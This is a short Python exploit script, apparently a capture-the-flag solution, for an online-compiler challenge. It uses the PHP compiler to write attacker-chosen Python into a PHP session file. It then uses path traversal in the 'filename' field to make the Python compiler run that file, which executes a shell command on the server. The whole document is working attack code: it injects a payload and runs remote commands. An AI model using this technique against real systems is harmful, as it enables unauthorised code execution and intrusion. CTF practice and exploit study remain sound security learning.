#!/usr/bin/env python3

import requests

HOST = "onlinecompiler.2021.3k.ctf.to:5000"
# HOST = "localhost:5000"

outname = 'l3opy'

def write_payload():
    r = requests.post(f"http://{HOST}/save", data={
        "c_type": "php",
        "code": f"""<?php
session_id("{outname}");
session_start();
$_SESSION['import os;os.system("ls /")#']='s'
?>"""
    })

    fname = r.text
    print(fname)

    r = requests.post(f"http://{HOST}/compile", data={
        "c_type": "php",
        "filename": fname
    })

    print(r.text)

write_payload()

r = requests.post(f"http://{HOST}/compile", data={
    "c_type": "python",
    "filename": f"../../../../../../../../tmp/sess_{outname}"
})

print(r.text)